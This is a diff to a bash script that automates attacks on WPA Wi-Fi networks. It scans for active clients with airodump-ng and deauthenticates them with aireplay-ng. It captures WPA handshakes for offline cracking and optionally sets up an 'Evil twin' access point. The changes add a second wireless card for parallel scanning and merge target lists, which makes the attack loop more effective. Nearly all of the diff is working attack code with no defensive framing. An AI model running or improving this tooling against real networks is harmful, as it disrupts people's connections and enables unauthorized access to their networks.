@@ -107,7 +107,7 @@ pyrit"""
 		then
 			if [ $EVIL = 1 ] 2>/dev/null
 				then
-					echo $RED" [*]$GRN Evil twin$RED attack requires two wireless cards, turning it off..."
+					echo $RED" [*]$GRN Evil twin$RED attack requires$GRN two$RED wireless cards, turning it off..."
 					EVIL=""
 			fi
 	fi
@@ -299,29 +299,28 @@ fclientscan()															#Find active clients
 {
 	CNT="0"
 	clear
-	echo -e $RED""" [*] Attacking:\t\t$GRN$ESSID$RED
- [*] BSSID:\t\t$GRN$BSSID$RED
- [*] Channel:\t\t$GRN$CHAN$RED"
-	echo
-	echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
-	DONE=""
 	if [ $EVIL = 1 ] 2> /dev/null
 		then
-			CIPHER=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 7 | head -n1)
+			CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n1)
 			CIPHER=${CIPHER:1}
 			MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
 			CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
-			WPA=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 6 | head -n1)
+			WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n1)
 			WPA=${WPA:1}
 			if [ $MIXED = $CIPHER ] 2> /dev/null
 				then
 					EVIL=1
 				else
 					echo $RED" [*] $GRN$ESSID$RED is Mixed CCMP/TKIP encryption,$GRN Evil Twin$RED is unlikely to work, turning it off"
-					echo
 					EVIL=""
 			fi
 	fi
+	echo -e $RED""" [*] Attacking:\t\t $GRN$ESSID$RED
+ [*] BSSID:\t\t $GRN$BSSID$RED
+ [*] Channel:\t\t $GRN$CHAN$RED"
+	echo
+	echo $BLU" [*] Please wait while I search for$GRN active clients$BLU.. [*] "
+	DONE=""
 	rm -rf $HOME/tmp* 2> /dev/null
 	sleep 0.4
 	if [ $EVIL -z ] 2> /dev/null
@@ -350,12 +349,17 @@ fclientscan()															#Find active clients
 		do
 			sleep 0.5
 			CLIENT=$(cat $HOME/tmp-01.csv 2> /dev/null | grep Station -A 20 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
+			if [ $CLIENT -z ] 2> /dev/null
+				then
+					CLIENT=$(cat $HOME/tmpe-01.csv 2> /dev/null | grep Station -A 20 | grep "$BSSID" | grep : | cut -d ',' -f 1 | head -n 1)
+			fi
 		done
 	fautocap
 }
 
 fbotstart()																#Startup Autobot
 {	
+	killall airodump-ng 2> /dev/null
 	MONS="$(ifconfig | grep mon | cut -d ' ' -f 1)"
 	NICS="$(ifconfig | grep wlan | cut -d ' ' -f 1)"
 	echo $BLU" [*] Changing monitor device MAC addresses. "
@@ -390,7 +394,8 @@ fbotstart()																#Startup Autobot
 	echo $BLU" [>]$GRN AUTOBOT ENGAGED$BLU [<] "
 	echo
 	echo " [*]$GRN Scanning$BLU for new active clients.. ";$COLOR2 9
-	gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+	gnome-terminal -t "$NIC2 Scanning.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt WPA&
 	DONE=""
 	PWRCHK=1;RESETCNT=1;MNUM=0;LNUM=0
 	GOT=$(cat $OUTDIR/got);echo "$GOT" | sort -u > $OUTDIR/got
@@ -407,7 +412,8 @@ fautobot()																#Automagically find new target clients
 			killall airodump-ng
 			sleep 0.7
 			rm -rf $HOME/tmp*
-			gnome-terminal -t "$NIC Scanning.." --geometry=100x40+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "$NIC Scanning.." --geometry=100x20+0+200 -x airodump-ng $MON1 -f 400 -a -w $HOME/tmp -o csv --encrypt WPA&
+			gnome-terminal -t "$NIC2 Scanning.." --geometry=100x20+0+600 -x airodump-ng $MON2 -f 400 -a -w $HOME/tmpe -o csv --encrypt WPA&
 			MNUM=0
 			LNUM=0
 			RESETCNT=1
@@ -417,8 +423,15 @@ fautobot()																#Automagically find new target clients
 		then
 			sleep 1
 			fautobot
+		else
+			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
 	fi
-	echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" > $HOME/tmp2
+	if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
+		then
+			echo "$(cat $HOME/tmp-01.csv | grep 'Station' -A 20 | grep : | cut -d ',' -f 6 | tr -d '(not associated)' | sed '/^$/d' | sort -u)" >> $HOME/tmp2
+			UNIQ="$(cat $HOME/tmp2 | sort -u)"
+			echo "$UNIQ" > $HOME/tmp2
+	fi
 	if [ $(cat $HOME/tmp2) -z ] 2> /dev/null
 		then
 			RESETCNT=$((RESETCNT + 1))
@@ -505,7 +518,7 @@ fautobot()																#Automagically find new target clients
 			DEPASS=""
 			if [ $EVIL = 1 ] 2> /dev/null
 				then
-					CIPHER=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 7 | head -n1)
+					CIPHER=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 7 | head -n1)
 					CIPHER=${CIPHER:1}
 					MIXED=$(echo $CIPHER | cut -d ' ' -f 2)
 					CIPHER=$(echo $CIPHER | cut -d ' ' -f 1)
@@ -519,7 +532,7 @@ fautobot()																#Automagically find new target clients
 							PUTEVIL=1
 							EVIL=""
 					fi
-					WPA=$(cat $HOME/tmp-01.csv | grep $ESSID | cut -d ',' -f 6 | head -n1)
+					WPA=$(cat $HOME/tmp-01.csv | grep "$ESSID" | cut -d ',' -f 6 | head -n1)
 					WPA=${WPA:1}
 			fi
 			killall airodump-ng
@@ -563,6 +576,12 @@ fautocap()																#Deauth targets and collect handshakes
 				then
 					TARGETS="$(cat $HOME/tmp-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
 			fi
+			if [ -f $HOME/tmpe-01.csv ] 2> /dev/null
+				then
+					TARGETS2="$(cat $HOME/tmpe-01.csv | grep Station -A 20 | grep : | cut -d ',' -f 1 | sort -u)"
+					TARGETS="$TARGETS\n$TARGETS2"
+					TARGETS=$(echo -e "$TARGETS" | sort -u)
+			fi
 			if [ $DEPASS = "1" ] 2> /dev/null
 				then
 					if [ $POWERLIMIT -z ] 2> /dev/null
@@ -598,8 +617,8 @@ fautocap()																#Deauth targets and collect handshakes
 				then
 					echo $RED" [>]$GRN AUTOBOT$RED LOCKED IN [<] ";echo
 			fi
-			echo -e $RED" [*] Target ESSID:\t\t $GRN$ESSID$RED\t\t Loaded [*] "
-			echo -e $RED" [*] Target Client No.$GRN$DISPNUM:\t $CLIENT$RED\t Loaded [*]"$RST
+			echo -e $RED" [*] Target ESSID:\t $GRN$ESSID$RED\t\t Loaded   [*] "
+			echo -e $RED" [*] Target BSSID:\t $GRN$BSSID$RED\t Loaded   [*]"$RST
 			sleep 0.7
 			if [ $TARGETS -z ] 2> /dev/null
 				then
@@ -615,10 +634,9 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
-									sleep 1.8
-									echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
-									sleep 0.5
+									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
+									sleep 1
+									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 								done
 							sleep 3
 						else
@@ -639,10 +657,9 @@ fautocap()																#Deauth targets and collect handshakes
 										do
 											MACNUM=$((MACNUM + 1))
 											echo
-											aireplay-ng -0 3 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
-											sleep 2.8
-											echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
-											sleep 0.5
+											aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
+											sleep 1
+											echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 										done
 									sleep 3
 								else
@@ -666,9 +683,9 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									aireplay-ng -0 2 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
-									sleep 1.8
-									echo $RED" [*]$GRN Deauth Client number $MACNUM: $CLIENT$RED Launched"
+									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
+									sleep 1
+									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 								done
 							sleep 6
 					fi
@@ -697,7 +714,7 @@ fautocap()																#Deauth targets and collect handshakes
 					echo
 					if [ $EVIL = 1 ] 2> /dev/null
 						then
-							killall airbase-ng
+							killall airbase-ng 2> /dev/null
 							rm -rf $HOME/tmpe-01.cap
 					fi
 					sleep 0.2
@@ -706,11 +723,10 @@ fautocap()																#Deauth targets and collect handshakes
 						then
 							if [ $DO = 'A' ] 2> /dev/null
 								then
-									killall airodump-ng
 									if [ $EVIL = 1 ] 2> /dev/null
 										then
 											CHKBASE=""
-											killall airbase-ng
+											killall airbase-ng 2> /dev/null
 									fi
 									rm -rf $HOME/tmp*
 									fbotstart
@@ -719,7 +735,6 @@ fautocap()																#Deauth targets and collect handshakes
 									if [ $EVIL = 1 ] 2> /dev/null
 										then
 											CHKBASE=""
-											killall airbase-ng
 									fi
 									fexit
 							fi
@@ -743,13 +758,13 @@ fautocap()																#Deauth targets and collect handshakes
 		then
 			if [ $EDONE = 1 ] 2> /dev/null
 				then
-					killall airbase-ng
+					killall airbase-ng 2> /dev/null
 					mkdir -p $HOME/Desktop/cap/handshakes/cowpatty	
 					cp $HOME/tmpe-01.cap $HOME/Desktop/cap/handshakes/cowpatty/$ESSID-$DATE.cap
 					CAPF=$HOME/Desktop/cap/handshakes/cowpatty/$ESSID-$DATE.cap
 					echo " [*] Handshake saved to$BLU $CAPF$GRN [*] "
 				else
-					killall airbase-ng
+					killall airbase-ng 2> /dev/null
 					echo " [*] Handshake saved to$BLU $OUTDIR/$ESSID-$DATE.cap$GRN [*] "
 			fi
 		else
